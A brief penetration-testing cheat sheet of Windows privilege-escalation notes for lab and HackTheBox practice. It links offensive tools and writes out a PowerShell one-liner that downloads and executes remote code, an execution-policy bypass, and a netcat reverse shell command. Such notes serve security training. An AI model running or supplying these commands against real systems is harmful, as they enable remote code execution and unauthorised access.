## Windows

living off the land binaries: [LOLBAS](https://lolbas-project.github.io/)

### Enumeration

Windows Privilege Escalation Enumeration Script: [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Little bit o' everything: [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)

### Unsorted

Powershell full path: `C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe`

Powershell "wget" and execute remote code:

```text
powershell "Invoke-Expression(New-Object Net.Webclient).downloadString('http://<ip>:<port>/<filename>')"
```

Powershell Script Execution Bypass: \[can embed in php too!\]:

```text
echo IEX(New-Object Net.WebClient).DownloadString(http://<ip:port/filename.ps1>) | powershell -noprofile -
```

Powershell reverse shell and exploit scripts: nishang [Ippsec:HacktheBox - Optimum](https://www.youtube.com/watch?v=kWTnVBIpNsE)

Netcat reverse shell \(after uploading the binary!\): `nc64.exe -e cmd <ip port>`

tools: [https://specterops.io/resources/research-and-development](https://specterops.io/resources/research-and-development)

easy windows shell: unicorn.py [trustedsec/unicorn](https://github.com/trustedsec/unicorn) [HackTheBox - Arctic](https://www.youtube.com/watch?v=e9lVyFH7-4o)

system information: `sysinfo`

Get user id: `getuid`

Powershell privilege escalation:

* [PowerUp.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) from PowerShellEmpire
* Sherlock.ps1

[fuzzbunch](https://github.com/peterpt/fuzzbunch): exploit tool similar to metasploit

check what updates are installed: `type WindowsUpdate.log`

net use share from linux \[like SimpleHTTPServer for Samba\]: `impacket-smbserver <sharename> '<dir_to_share>'`
